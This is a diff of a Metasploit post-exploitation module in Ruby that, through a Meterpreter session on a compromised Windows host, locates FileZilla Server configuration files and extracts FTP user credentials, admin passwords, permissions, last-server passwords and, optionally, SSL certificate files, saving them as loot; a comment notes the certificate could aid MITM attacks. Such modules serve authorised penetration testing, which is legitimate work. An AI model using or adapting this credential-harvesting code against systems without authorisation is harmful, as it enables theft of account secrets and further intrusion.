@@ -37,57 +37,34 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
-    locations = []
-    progfiles_env.each do |k, v|
-      next if v.blank?
-      locations << v + "\\FileZilla Server\\"
-    end
+    @progs = "#{session.sys.config.getenv('ProgramFiles')}\\"
 
-    keys = [
-      "HKLM\\SOFTWARE\\FileZilla Server",
-      "HKLM\\SOFTWARE\\Wow6432Node\\FileZilla Server",
-    ]
-
-    keys.each do |key|
-      begin
-        root_key, base_key = session.sys.registry.splitkey(key)
-        value = session.sys.registry.query_value_direct(root_key, base_key, "install_dir")
-      rescue Rex::Post::Meterpreter::RequestError => e
-        vprint_error(e.message)
-        next
-      end
-      locations << value.data + "\\"
-    end
-
-    locations = locations.uniq
-    filezilla = check_filezilla(locations)
+    filezilla = check_filezilla
     get_filezilla_creds(filezilla) if filezilla
   end
 
 
-  def check_filezilla(locations)
+  def check_filezilla
     paths = []
+    path = @progs + "FileZilla Server\\"
+
+    print_status("Checking for Filezilla Server directory in: #{path}")
+
     begin
-      locations.each do |location|
-        print_status("Checking for Filezilla Server directory in: #{location}")
-        begin
-          session.fs.dir.foreach("#{location}") do |fdir|
-            ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do |xmlfile|
-              if fdir == xmlfile
-                filepath = location + xmlfile
-                print_good("Configuration file found: #{filepath}")
-                paths << filepath
-              end
-            end
-          end
-        rescue Rex::Post::Meterpreter::RequestError => e
-          vprint_error(e.message)
-        end
-      end
+      session.fs.dir.entries(path)
     rescue ::Exception => e
       print_error(e.to_s)
       return
+    end
+
+    session.fs.dir.foreach(path) do |fdir|
+      ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do |xmlfile|
+        if fdir == xmlfile
+          filepath = path + xmlfile
+          vprint_status("Configuration file found: #{filepath}")
+          paths << filepath
+        end
+      end
     end
 
     if !paths.empty?
@@ -183,7 +160,7 @@ class MetasploitModule < Msf::Post
       session.db_record ? (source_id = session.db_record.id) : (source_id = nil)
 
       service_data = {
-        address: session.session_host,
+        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
         port: config['ftp_port'],
         service_name: 'ftp',
         protocol: 'tcp',
@@ -212,7 +189,7 @@ class MetasploitModule < Msf::Post
 
       # Merge in the service data and create our Login
       login_data.merge!(service_data)
-      create_credential_login(login_data)
+      login = create_credential_login(login_data)
     end
 
     perms.each do |perm|
@@ -224,12 +201,13 @@ class MetasploitModule < Msf::Post
     session.db_record ? (source_id = session.db_record.id) : (source_id = nil)
 
     # report the goods!
-    if config['admin_pass'] == "<none>"
+    if config['ftp_port'] == "<none>"
       vprint_status("Detected Default Adminstration Settings:")
+      config['ftp_port'] = "21"
     else
       vprint_status("Collected the following configuration details:")
       service_data = {
-        address: session.session_host,
+        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
         port: config['admin_port'],
         service_name: 'filezilla-admin',
         protocol: 'tcp',
@@ -257,7 +235,7 @@ class MetasploitModule < Msf::Post
 
       # Merge in the service data and create our Login
       login_data.merge!(service_data)
-      create_credential_login(login_data)
+      login = create_credential_login(login_data)
     end
 
     vprint_status("       FTP Port: #{config['ftp_port']}")
@@ -271,33 +249,31 @@ class MetasploitModule < Msf::Post
     configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'],
       config['admin_pass'], config['ssl'], config['ssl_certfile'], config['ssl_keypass']]
 
-    begin
-      lastser = parse_interface(fsi_xml)
-      lastserver << [lastser['ip'], lastser['port'], lastser['password']]
-      vprint_status("Last Server Information:")
-      vprint_status("         IP: #{lastser['ip']}")
-      vprint_status("       Port: #{lastser['port']}")
-      vprint_status("   Password: #{lastser['password']}")
-      vprint_line
 
-    rescue
-      vprint_error("Could not parse FileZilla Server Interface.xml")
-    end
-    loot_path = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
+    lastser = parse_interface(fsi_xml)
+    lastserver << [lastser['ip'], lastser['port'], lastser['password']]
+
+    vprint_status("Last Server Information:")
+    vprint_status("         IP: #{lastser['ip']}")
+    vprint_status("       Port: #{lastser['port']}")
+    vprint_status("   Password: #{lastser['password']}")
+    vprint_line
+
+    p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
       "filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
-    print_status("Credentials saved in: #{loot_path}")
+    print_status("Credentials saved in: #{p.to_s}")
 
-    loot_path = store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
+    p = store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
       "filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
-    print_status("Permissions saved in: #{loot_path}")
+    print_status("Permissions saved in: #{p.to_s}")
 
-    loot_path = store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
+    p = store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
       "filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
-    print_status("     Config saved in: #{loot_path}")
+    print_status("     Config saved in: #{p.to_s}")
 
-    loot_path = store_loot("filezilla.server.lastser", "text/csv", session, lastserver.to_csv,
+    p = store_loot("filezilla.server.lastser", "text/csv", session, lastserver.to_csv,
       "filezilla_server_lastserver.csv", "FileZilla FTP Last Server")
-    print_status(" Last server history: #{loot_path}")
+    print_status(" Last server history: #{p.to_s}")
 
     print_line
   end
@@ -313,16 +289,16 @@ class MetasploitModule < Msf::Post
 
     begin
       doc = REXML::Document.new(data).root
-    rescue REXML::ParseException
+    rescue REXML::ParseException => e
       print_error("Invalid xml format")
     end
 
     opt = doc.elements.to_a("Settings/Item")
     if opt[1].nil?    # Default value will only have a single line, for admin port - no adminstration settings
       settings['admin_port'] = opt[0].text rescue "<none>"
-      settings['ftp_port']   = 21
+      settings['ftp_port']   = "<none>"
     else
-      settings['ftp_port']   = opt[0].text rescue 21
+      settings['ftp_port']   = opt[0].text rescue "<none>"
       settings['admin_port'] = opt[16].text rescue "<none>"
     end
     settings['admin_pass'] = opt[17].text rescue "<none>"
@@ -345,14 +321,17 @@ class MetasploitModule < Msf::Post
     end
     settings['ftp_bindip'] = "0.0.0.0" if settings['ftp_bindip'] == "*" || settings['ftp_bindip'].empty?
 
-    settings['ssl'] = settings['ssl'] == "1"
-    if !settings['ssl'] && datastore['SSLCERT']
-      print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
+    if settings['ssl'] == "1"
+      settings['ssl'] = "true"
+    else
+      if datastore['SSLCERT']
+        print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
+      end
+      settings['ssl'] = "false"
     end
 
     settings['ssl_certfile'] = items[45].text rescue "<none>"
-    # Get the file if it is there. It could be useful in MITM attacks
-    if settings['ssl_certfile'] != "<none>" && settings['ssl'] and datastore['SSLCERT']
+    if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT'] # lets get the file if its there could be useful in MITM attacks
       sslfile = session.fs.file.new(settings['ssl_certfile'])
       until sslfile.eof?
         sslcert << sslfile.read
@@ -407,7 +386,7 @@ class MetasploitModule < Msf::Post
 
       account['host'] = settings['ftp_bindip']
       account['port'] = settings['ftp_port']
-      account['ssl']  = settings['ssl'].to_s
+      account['ssl']  = settings['ssl']
       creds << account
 
       vprint_status("    Username: #{account['user']}")
@@ -434,23 +413,15 @@ class MetasploitModule < Msf::Post
 
     begin
       doc = REXML::Document.new(data).root
-    rescue REXML::ParseException
+    rescue REXML::ParseException => e
       print_error("Invalid xml format")
-      return lastser
     end
 
     opt = doc.elements.to_a("Settings/Item")
 
-    opt.each do |item|
-      case item.attributes['name']
-      when /Address/
-        lastser['ip'] = item.text
-      when /Port/
-        lastser['port'] = item.text
-      when /Password/
-        lastser['password'] = item.text
-      end
-    end
+    lastser['ip']       = opt[0].text rescue "<none>"
+    lastser['port']     = opt[1].text rescue "<none>"
+    lastser['password'] = opt[2].text rescue "<none>"
 
     lastser['password'] = "<none>" if lastser['password'].nil?
 
